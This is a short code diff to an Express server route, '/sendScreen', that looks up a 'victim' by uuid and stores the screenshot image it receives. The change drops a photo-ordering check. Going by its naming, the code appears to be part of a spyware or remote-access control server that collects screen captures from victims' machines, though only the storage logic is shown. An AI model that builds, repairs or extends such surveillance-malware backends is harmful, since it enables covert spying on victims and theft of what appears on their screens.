@@ -82,7 +82,7 @@ app.post('/sendScreen', async (req,res) => {
       console.log(req.body)
       const victim = victims.find(v => v.uuid === req.body.uuid)
       console.log(victim)
-      if (victim && victim.photoId && victim.photoId < req.body.photoId) {
+      if (victim && victim.photoId) {
         victim.currentPhoto = req.body.image
         victim.photoId = req.body.photoId
         console.log('added photo!')
